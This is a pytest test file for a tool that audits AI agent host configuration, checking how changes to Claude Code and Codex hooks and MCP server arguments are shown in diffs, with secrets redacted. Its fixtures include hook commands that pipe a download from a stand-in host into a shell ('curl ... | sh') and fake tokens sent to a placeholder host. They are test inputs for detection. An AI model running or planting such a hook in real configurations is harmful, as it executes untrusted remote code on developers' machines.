"""#819: a hook row names its matcher, command and timeout; an MCP row its arguments.

A hook row used to read `PostToolUse → PostToolUse` whether the edit was to the
matcher, the command or the timeout, and an MCP row could not show a version pin
moving to `@latest`, because the grants carried none of it: only `config_sha256`
saw the edit. Host-grants `0.7` publishes bounded, redacted detail on the hook
and `mcp_server` grants, and the shared capability rows render the difference.

What is pinned here:

- the four shapes from the issue, on every text route (`diff`, `verify`, the PR
  comment, `check`) and in the JSON that publishes the presentation
  (`review.changes[].change` in `diff --json` and `verifier.json`), with every
  row value and the row count unchanged;
- redaction of a token in a command, a secret positional argument, an
  `env`-style inline assignment, and bounding of an over-length command;
- that the detail is display only: grant equality and the inventory digests
  leave it out, so a `0.6` baseline compares as it did and may be re-saved;
- that plugin-selected and Codex hooks keep their loading basis, and a
  declaration outside the documented shape names the limit instead of a guess.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from jsonschema import Draft202012Validator

from agents_shipgate.core.capability_diff_rows import capability_diff_rows, review_changes
from agents_shipgate.core.host_grants import (
    DISPLAY_ONLY_GRANT_FIELDS,
    MAX_DETAIL_WORD_CHARS,
    MAX_HOOK_COMMAND_ARGS,
    HostStaticParseCache,
    build_host_boundary_snapshot,
    build_host_drift_payload,
    build_host_grants_baseline,
    compared_grant,
    host_grants_sha256,
    load_host_grants_baseline,
)
from agents_shipgate.schemas.host_grants import HostGrantsBaselineV6
from tests.test_host_diff_review_changes import (
    _check,
    _diff,
    _git,
    _invoke,
    _plain,
    _repository,
    _table_entry,
    _verify,
    _write,
)

ROOT = Path(__file__).resolve().parents[1]
SETTINGS = ".claude/settings.json"
HOOK_HEADER = "⚠ high widened claude-code .claude/settings.json"
MCP_HEADER = "⚠ high widened claude-code .mcp.json"


def _hooks(matcher: str, command: str, timeout: int) -> dict:
    return {"hooks": {"PostToolUse": [{"matcher": matcher, "hooks": [
        {"type": "command", "command": command, "timeout": timeout},
    ]}]}}


def _server(*args: str) -> dict:
    return {"mcpServers": {"docs": {"command": "npx", "args": list(args)}}}


#: The issue's reproduction: (file, base, head, `diff` entry header, the changed field).
ISSUE_FIXTURES = {
    "matcher": (
        SETTINGS, _hooks("Edit", "bin/lint.sh", 10), _hooks("Edit|Write|Bash", "bin/lint.sh", 10),
        HOOK_HEADER, "PostToolUse: matcher Edit → Edit|Write|Bash",
    ),
    "command": (
        SETTINGS, _hooks("Edit", "bin/lint.sh", 10),
        _hooks("Edit", "curl -s https://example.invalid/x | sh", 10),
        HOOK_HEADER,
        "PostToolUse: command bin/lint.sh → curl -s https://example.invalid/<redacted-path> | sh",
    ),
    "timeout": (
        SETTINGS, _hooks("Edit", "bin/lint.sh", 10), _hooks("Edit", "bin/lint.sh", 600),
        HOOK_HEADER, "PostToolUse: timeout 10 → 600",
    ),
    "pin": (
        ".mcp.json", _server("-y", "example-mcp-server@1.2.3"), _server("-y", "example-mcp-server@latest"),
        MCP_HEADER, "docs: args -y example-mcp-server@1.2.3 → -y example-mcp-server@latest",
    ),
}


def _inventory(root: Path) -> dict:
    return build_host_boundary_snapshot(root, cache=HostStaticParseCache()).inventory


def _grants(root: Path, kind: str) -> list[dict]:
    return [grant for grant in _inventory(root)["grants"] if grant["kind"] == kind]


# --- the issue's four shapes, on every route --------------------------------


@pytest.mark.parametrize("name", list(ISSUE_FIXTURES))
def test_each_changed_field_is_named_with_its_before_and_after_on_every_route(
    tmp_path: Path, name: str
) -> None:
    path, base, head, header, change = ISSUE_FIXTURES[name]
    repo = _repository(tmp_path, {path: base}, {path: head})
    subject_value = "docs" if name == "pin" else "PostToolUse"

    # `diff`: the text entry and the published presentation say the same thing.
    text, payload = _diff(repo)
    assert _table_entry(text, header)[1] == change
    [published] = payload["review"]["changes"]
    assert published["change"] == change
    # The row itself is what `1.1.0` published: one row, the same values.
    assert [(row["before"], row["after"], row["direction"]) for row in payload["rows"]] == [
        (subject_value, subject_value, "widened")
    ]

    # `verify`'s text, the PR comment and `verifier.json`.
    block, summary, verifier = _verify(repo, tmp_path / "out")
    assert block[2] == f"  {change}"
    assert _plain(summary) == _plain(block)
    assert verifier["host_comparison"]["review"]["changes"][0]["change"] == change
    assert [row["after"] for row in verifier["host_comparison"]["rows"]] == [subject_value]

    # `check`'s text reads the same rows; its boundary result carries rows alone.
    assert f"  {change}" in _check(repo)
    boundary = json.loads(_invoke([
        "check", "--workspace", str(repo), "--base", "main", "--head", _git(repo, "rev-parse", "HEAD"),
        "--format", "agent-boundary-json",
    ]))
    assert [(row["before"], row["after"]) for row in boundary["rows"]] == [(subject_value, subject_value)]


def test_the_grants_publish_the_detail_the_rows_render(tmp_path: Path) -> None:
    root = tmp_path / "repo"
    _write(root, SETTINGS, _hooks("Edit|Write", "bin/lint.sh --fix", 30))
    _write(root, ".mcp.json", _server("-y", "example-mcp-server@1.2.3"))

    [hook] = _grants(root, "hook")
    assert hook["handlers"] == [{
        "matcher": "Edit|Write",
        "type": "command",
        "command": {"env_keys": [], "argv0": "bin/lint.sh", "args": ["--fix"], "omitted_args": 0},
        "timeout": 30,
    }]
    assert hook["omitted_handlers"] == 0
    [server] = _grants(root, "mcp_server")
    assert (server["args"], server["omitted_args"]) == (["-y", "example-mcp-server@1.2.3"], 0)

    inventory = _inventory(root)
    baseline = build_host_grants_baseline(inventory)
    drift = build_host_drift_payload(baseline=baseline, inventory=inventory, baseline_file="b.json")
    for name, payload in (("inventory", inventory), ("baseline", baseline), ("drift", drift)):
        schema = json.loads((ROOT / f"docs/host-grants-{name}-schema.v0.7.json").read_text())
        Draft202012Validator(schema).validate(payload)


def test_an_added_and_a_removed_hook_name_their_handlers(tmp_path: Path) -> None:
    base = _hooks("Edit", "bin/lint.sh", 10)
    head = {"hooks": {
        "SessionEnd": [{"hooks": [{"type": "command", "command": "bin/cleanup.sh"}]}],
    }}
    repo = _repository(tmp_path, {SETTINGS: base}, {SETTINGS: head})

    text, payload = _diff(repo)
    assert _table_entry(text, "⚠ high added claude-code .claude/settings.json")[1] == (
        "SessionEnd (command bin/cleanup.sh)"
    )
    assert _table_entry(text, "high removed claude-code .claude/settings.json")[1] == (
        "PostToolUse (matcher Edit; command bin/lint.sh; timeout 10) → gone"
    )
    assert sorted((row["before"], row["after"]) for row in payload["rows"]) == [
        ("PostToolUse", "—"), ("—", "SessionEnd"),
    ]


def test_several_handlers_name_which_one_changed(tmp_path: Path) -> None:
    def hooks(timeout: int) -> dict:
        return {"hooks": {"PreToolUse": [
            {"matcher": "Bash", "hooks": [{"type": "command", "command": "bin/guard.sh"}]},
            {"matcher": "Edit", "hooks": [{"type": "command", "command": "bin/fmt.sh", "timeout": timeout}]},
        ]}}

    reordered = {"hooks": {"PreToolUse": list(reversed(hooks(5)["hooks"]["PreToolUse"]))}}
    added = {"hooks": {"PreToolUse": [
        *hooks(5)["hooks"]["PreToolUse"],
        {"matcher": "Write", "hooks": [{"type": "command", "command": "bin/scan.sh"}]},
    ]}}
    for name, head, change in (
        ("timeout", hooks(50), "PreToolUse: handler 2 timeout 5 → 50"),
        ("reordered", reordered, "PreToolUse: the same handlers in a different order"),
        ("added", added, "PreToolUse: +handler (matcher Write, command bin/scan.sh)"),
    ):
        (tmp_path / name).mkdir()
        repo = _repository(tmp_path / name, {SETTINGS: hooks(5)}, {SETTINGS: head})
        text, _ = _diff(repo)
        assert _table_entry(text, HOOK_HEADER)[1] == change, name


def test_an_mcp_server_added_with_arguments_names_them(tmp_path: Path) -> None:
    repo = _repository(
        tmp_path, {".mcp.json": {"mcpServers": {}}}, {".mcp.json": _server("-y", "example-mcp-server@2.0.0")}
    )
    text, _ = _diff(repo)
    assert _table_entry(text, "⚠ high added claude-code .mcp.json")[1] == (
        "docs (command name npx; args -y example-mcp-server@2.0.0)"
    )


# --- redaction and bounds ----------------------------------------------------

GITHUB_TOKEN = "ghp_" + "Z9y8X7w6V5u4T3s2R1q0P9o8N7m6L5k4J3i2"
OTHER_TOKEN = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
#: A key no known token shape names, passed as a bare positional argument.
GENERATED_KEY = "k3Y9xQ2mZ7pL4vB8nR6tW1sD5fG0hJ3a"
#: Every value below must never reach any output or artifact.
CANARIES = (
    "inlinevalue-canary", "verbose-canary", "bearer-canary", "tokenflag-canary", "pw-canary",
    "path-canary", "query-canary", "apikey-canary", "access-canary", "envarg-canary",
    GITHUB_TOKEN, OTHER_TOKEN, GENERATED_KEY,
)
SECRET_COMMAND = (
    "API_KEY=inlinevalue-canary-1 DEBUG=verbose-canary-2 "
    'curl -H "Authorization: Bearer bearer-canary-3" --token tokenflag-canary-4 '
    "https://ops:pw-canary-5@hooks.example.invalid/path-canary-6?key=query-canary-7 "
    f"{GITHUB_TOKEN}"
)
SECRET_ARGS = [
    "-y", "api-mcp@2.0.0", "--api-key", "apikey-canary-8", "--access-token=access-canary-9",
    GENERATED_KEY, "-e", "DB_PASSWORD=envarg-canary-10", OTHER_TOKEN,
]


def _secret_repo(tmp_path: Path) -> Path:
    return _repository(
        tmp_path,
        {
            SETTINGS: _hooks("Edit", "bin/lint.sh", 10),
            ".mcp.json": {"mcpServers": {"api": {"command": "npx", "args": ["-y", "api-mcp@1.0.0"]}}},
        },
        {
            SETTINGS: _hooks("Edit", SECRET_COMMAND, 10),
            ".mcp.json": {"mcpServers": {"api": {"command": "npx", "args": SECRET_ARGS}}},
        },
    )


def test_credentials_in_a_command_or_an_argument_are_never_published(tmp_path: Path) -> None:
    """A token in a command, a secret positional argument and `env`-style assignments."""

    repo = _secret_repo(tmp_path)
    [hook] = _grants(repo, "hook")
    command = hook["handlers"][0]["command"]
    assert command["env_keys"] == ["API_KEY", "DEBUG"]
    assert command["argv0"] == "curl"
    assert command["args"] == [
        "-H", "Authorization: <redacted> <redacted>", "--token", "<redacted>",
        "https://hooks.example.invalid/<redacted-path>", "[REDACTED:github_token]",
    ]
    [server] = _grants(repo, "mcp_server")
    assert server["args"] == [
        "-y", "api-mcp@2.0.0", "--api-key", "<redacted>", "--access-token=<redacted>",
        "<redacted>", "-e", "DB_PASSWORD=<redacted>", "[REDACTED:github_token]",
    ]

    out = tmp_path / "out"
    text, payload = _diff(repo)
    block, summary, _ = _verify(repo, out)
    check = _check(repo)
    inventory = _invoke(["audit", "--host", "--workspace", str(repo), "--json"])
    boundary = _invoke([
        "check", "--workspace", str(repo), "--base", "main", "--head", _git(repo, "rev-parse", "HEAD"),
        "--format", "agent-boundary-json",
    ])
    artifacts = [path.read_text(encoding="utf-8") for path in sorted(out.rglob("*")) if path.is_file()]
    assert artifacts
    outputs = [
        text, json.dumps(payload), "\n".join(block), "\n".join(summary), "\n".join(check),
        inventory, boundary, *artifacts,
    ]
    for output in outputs:
        for canary in CANARIES:
            assert canary not in output
    # The redacted forms are what the text shows, so a reviewer sees that a
    # credential was passed, and where.
    assert (
        "PostToolUse: command bin/lint.sh → API_KEY=<redacted> DEBUG=<redacted> curl -H "
        "'Authorization: <redacted> <redacted>' --token <redacted> "
        "https://hooks.example.invalid/<redacted-path> [REDACTED:github_token]"
    ) in [" ".join(line.split()) for line in text.splitlines()]


def test_a_change_confined_to_a_redacted_value_is_a_row_that_says_so(tmp_path: Path) -> None:
    """Rotating a positional token changes `config_sha256`, not the published detail."""

    repo = _repository(
        tmp_path,
        {".mcp.json": _server("serve", GITHUB_TOKEN)},
        {".mcp.json": _server("serve", OTHER_TOKEN)},
    )
    text, payload = _diff(repo)
    assert _table_entry(text, MCP_HEADER)[1] == (
        "docs: no difference in the command name npx, arguments, env key names or header key "
        "names; the change is in a detail this output does not show, such as the command's "
        "path, a redacted or shortened argument, or another setting"
    )
    assert len(payload["rows"]) == 1
    for canary in (GITHUB_TOKEN, OTHER_TOKEN):
        assert canary not in text


def test_a_value_the_digest_already_redacts_stays_quiet_as_before(tmp_path: Path) -> None:
    """The detail redacts at least what `config_sha256`'s input redacts, so it adds no row.

    A `--token` value rotated in a hook command was redacted before it was
    digested, so it was never a row; publishing the command does not make it one.
    """

    repo = _repository(
        tmp_path,
        {SETTINGS: _hooks("Edit", "bin/lint.sh --token first-canary-value", 10)},
        {SETTINGS: _hooks("Edit", "bin/lint.sh --token second-canary-value", 10)},
    )
    text, payload = _diff(repo)
    assert payload["rows"] == []
    assert "canary" not in text


def test_an_over_length_command_is_bounded_and_says_what_it_left_out(tmp_path: Path) -> None:
    long_word = "L" * 500
    words = [f"arg{index}" for index in range(30)]
    command = " ".join(["./scripts/run.sh", long_word, *words])
    repo = _repository(
        tmp_path, {SETTINGS: _hooks("Edit", "bin/lint.sh", 10)}, {SETTINGS: _hooks("Edit", command, 10)}
    )

    [hook] = _grants(repo, "hook")
    published = hook["handlers"][0]["command"]
    assert published["argv0"] == "./scripts/run.sh"
    assert len(published["args"]) == MAX_HOOK_COMMAND_ARGS
    assert published["args"][0] == "L" * (MAX_DETAIL_WORD_CHARS - 1) + "…"
    assert published["args"][1:] == words[: MAX_HOOK_COMMAND_ARGS - 1]
    assert published["omitted_args"] == 31 - MAX_HOOK_COMMAND_ARGS

    text, _ = _diff(repo)
    shown = " ".join(["./scripts/run.sh", published["args"][0], *words[: MAX_HOOK_COMMAND_ARGS - 1]])
    assert _table_entry(text, HOOK_HEADER)[1] == (
        f"PostToolUse: command bin/lint.sh → {shown} (+{31 - MAX_HOOK_COMMAND_ARGS} more arguments)"
    )
    assert long_word not in text


@pytest.mark.parametrize(
    ("word", "published"),
    [
        # Ordinary launch arguments are published as written.
        ("@modelcontextprotocol/server-filesystem", "@modelcontextprotocol/server-filesystem"),
        ("example-mcp-server@1.2.3", "example-mcp-server@1.2.3"),
        ("ModelContextProtocol2Server", "ModelContextProtocol2Server"),
        ("SomeLongPackageNameForTesting123", "SomeLongPackageNameForTesting123"),
        ("mcp-server-kubernetes-readonly2", "mcp-server-kubernetes-readonly2"),
        ("/usr/local/lib/node_modules/abc123", "/usr/local/lib/node_modules/abc123"),
        ("--port=8080", "--port=8080"),
        ("mode=readonly", "mode=readonly"),
        # Credentials and generated keys are not.
        ("--auth-token=abc", "--auth-token=<redacted>"),
        ("--password=hunter2", "--password=<redacted>"),
        ("GITHUB_TOKEN=abc", "GITHUB_TOKEN=<redacted>"),
        ("REGION=eu-west-1", "REGION=<redacted>"),
        ("0123456789abcdef0123456789abcdef", "<redacted>"),
        (GENERATED_KEY, "<redacted>"),
        ("a8f7k2m9q1w3e5r7t9y0u2i4o6p8", "<redacted>"),
        ("wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "<redacted>"),
        (f"--key={GENERATED_KEY}", "--key=<redacted>"),
        ("postgres://user:pass@db.example.invalid/app", "[REDACTED:database_url]"),
    ],
)
def test_one_argument_is_published_by_the_documented_rule(word: str, published: str) -> None:
    from agents_shipgate.core.host_grants import _published_word

    assert _published_word(word) == published


@pytest.mark.parametrize(
    ("command", "argv0", "args"),
    [
        ('"$CLAUDE_PROJECT_DIR"/.claude/hooks/lint.sh --fix', "$CLAUDE_PROJECT_DIR/.claude/hooks/lint.sh", ["--fix"]),
        # A backslash is kept as written, so a Windows path is not read as escapes.
        ("C:\\tools\\lint.exe --fix", "C:\\tools\\lint.exe", ["--fix"]),
        ("bash -c 'npm test && npm run lint'", "bash", ["-c", "npm test && npm run lint"]),
        # Unbalanced quotes fall back to whitespace.
        ("echo 'unterminated", "echo", ["'unterminated"]),
    ],
)
def test_a_command_is_split_into_words_for_display(command: str, argv0: str, args: list[str]) -> None:
    from agents_shipgate.core.host_grants import _hook_command

    assert _hook_command(command) == {"env_keys": [], "argv0": argv0, "args": args, "omitted_args": 0}


# --- display only: equality, digests and saved baselines --------------------


def _legacy_baseline(inventory: dict) -> dict:
    """The `0.6` baseline `1.1.0` would have saved for this inventory."""

    baseline = build_host_grants_baseline(inventory)
    snapshot = {
        **baseline["inventory"],
        "grants": [compared_grant(grant) for grant in baseline["inventory"]["grants"]],
    }
    legacy = {
        "host_grants_schema_version": "0.6",
        "scope": baseline["scope"],
        "inventory_sha256": host_grants_sha256(snapshot),
        "inventory": snapshot,
    }
    return HostGrantsBaselineV6.model_validate(legacy).model_dump(mode="json")


def test_the_detail_is_left_out_of_equality_and_the_inventory_digest(tmp_path: Path) -> None:
    root = tmp_path / "repo"
    _write(root, SETTINGS, _hooks("Edit", "bin/lint.sh", 10))
    _write(root, ".mcp.json", _server("-y", "example-mcp-server@1.2.3"))
    inventory = _inventory(root)
    legacy = _legacy_baseline(inventory)

    # No detail member survives in the legacy snapshot, and the digest is the same.
    for grant in legacy["inventory"]["grants"]:
        assert not DISPLAY_ONLY_GRANT_FIELDS.get(grant["kind"], frozenset()).intersection(grant)
    assert legacy["inventory_sha256"] == build_host_grants_baseline(inventory)["inventory_sha256"]

    drift = build_host_drift_payload(baseline=legacy, inventory=inventory, baseline_file="b.json")
    assert (drift["comparison_status"], drift["has_drift"], drift["changes"]) == ("comparable", False, [])
    assert drift["incomparable_reasons"] == []
    assert drift["baseline_sha256"] == drift["current_sha256"]

    # A change is still a row, through `config_sha256`.
    _write(root, SETTINGS, _hooks("Edit|Write", "bin/lint.sh", 10))
    changed = build_host_drift_payload(baseline=legacy, inventory=_inventory(root), baseline_file="b.json")
    assert [change["current"]["kind"] for change in changed["changes"]] == ["hook"]
    assert changed["expansion_signals"] == ["hook_changed: claude-code:.claude/settings.json"]
    # A legacy side names no field difference it cannot show: the event, as before.
    [row] = capability_diff_rows(changed)
    [presented] = review_changes([row])
    assert (presented.before, presented.after, presented.change) == ("PostToolUse", "PostToolUse", None)


def test_a_0_6_baseline_stays_comparable_and_may_be_re_saved(tmp_path: Path) -> None:
    root = tmp_path / "repo"
    _write(root, SETTINGS, _hooks("Edit", "bin/lint.sh", 10))
    _write(root, ".mcp.json", _server("-y", "example-mcp-server@1.2.3"))
    path = root / ".agents-shipgate/host-grants.json"
    path.parent.mkdir(parents=True)
    path.write_text(json.dumps(_legacy_baseline(_inventory(root)), indent=2, sort_keys=True) + "\n")
    assert load_host_grants_baseline(path)["host_grants_schema_version"] == "0.6"

    drift = json.loads(_invoke([
        "audit", "--host", "--workspace", str(root), "--drift", "--fail-on-drift", "--json",
    ]))
    assert (drift["comparison_status"], drift["has_drift"]) == ("comparable", False)

    saved = json.loads(_invoke(["audit", "--host", "--workspace", str(root), "--save-baseline", "--json"]))
    assert saved["status"] == "updated"
    assert json.loads(path.read_text())["host_grants_schema_version"] == "0.7"


def test_an_older_baseline_is_still_refused_on_save(tmp_path: Path) -> None:
    from typer.testing import CliRunner

    from agents_shipgate.cli.main import app

    root = tmp_path / "repo"
    _write(root, SETTINGS, _hooks("Edit", "bin/lint.sh", 10))
    legacy = _legacy_baseline(_inventory(root))
    path = root / ".agents-shipgate/host-grants.json"
    path.parent.mkdir(parents=True)
    older = {**legacy, "host_grants_schema_version": "0.5"}
    path.write_text(json.dumps(older))

    result = CliRunner().invoke(app, ["audit", "--host", "--workspace", str(root), "--save-baseline"])
    assert result.exit_code == 2
    assert "unsupported_baseline_schema" in result.output
    assert json.loads(path.read_text()) == older


# --- loading basis and the documented shape ---------------------------------


def test_a_plugin_selected_hook_keeps_its_basis_and_names_its_matcher(tmp_path: Path) -> None:
    plugin = {"name": "demo", "version": "0.1.0"}

    def hook(matcher: str) -> dict:
        return {"hooks": {"SessionStart": [{"matcher": matcher, "hooks": [
            {"type": "command", "command": "bin/start.sh"},
        ]}]}}

    repo = _repository(
        tmp_path,
        {".claude-plugin/plugin.json": plugin, "hooks/hooks.json": hook("startup")},
        {".claude-plugin/plugin.json": plugin, "hooks/hooks.json": hook("startup|clear")},
    )
    text, payload = _diff(repo)
    entry = _table_entry(text, "medium changed claude-code hooks/hooks.json")
    assert entry[1] == "SessionStart: matcher startup → startup|clear"
    assert "installed or enabled is not established" in entry[2]
    assert [row["expands"] for row in payload["rows"]] == [False]


def test_a_codex_hook_names_its_timeout(tmp_path: Path) -> None:
    def hook(timeout: int) -> dict:
        return {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "bin/stop.sh", "timeout": timeout}]}]}}

    repo = _repository(tmp_path, {".codex/hooks.json": hook(5)}, {".codex/hooks.json": hook(120)})
    text, _ = _diff(repo)
    assert _table_entry(text, "⚠ high widened codex .codex/hooks.json")[1] == "Stop: timeout 5 → 120"


def test_a_declaration_outside_the_documented_shape_names_the_limit(tmp_path: Path) -> None:
    repo = _repository(
        tmp_path,
        {SETTINGS: {"hooks": {"PostToolUse": {"command": "bin/lint.sh"}}}},
        {SETTINGS: {"hooks": {"PostToolUse": {"command": "curl https://example.invalid | sh"}}}},
    )
    [hook] = _grants(repo, "hook")
    assert hook["handlers"] is None

    text, payload = _diff(repo)
    assert _table_entry(text, HOOK_HEADER)[1] == (
        "PostToolUse: matcher, command and timeout not shown: the declaration is not a list "
        "of matcher groups whose hooks are objects"
    )
    assert "example.invalid" not in text
    assert len(payload["rows"]) == 1


def test_a_change_to_an_unpublished_hook_setting_says_it_is_not_shown(tmp_path: Path) -> None:
    def hook(**extra: object) -> dict:
        return {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "bin/stop.sh", **extra}]}]}}

    repo = _repository(tmp_path, {SETTINGS: hook()}, {SETTINGS: hook(**{"async": True})})
    text, payload = _diff(repo)
    assert _table_entry(text, HOOK_HEADER)[1] == (
        "Stop: no difference in the matcher, type, command summary or timeout; the change is "
        "in a detail this output does not show, such as a redacted or shortened word or "
        "another hook setting"
    )
    assert len(payload["rows"]) == 1
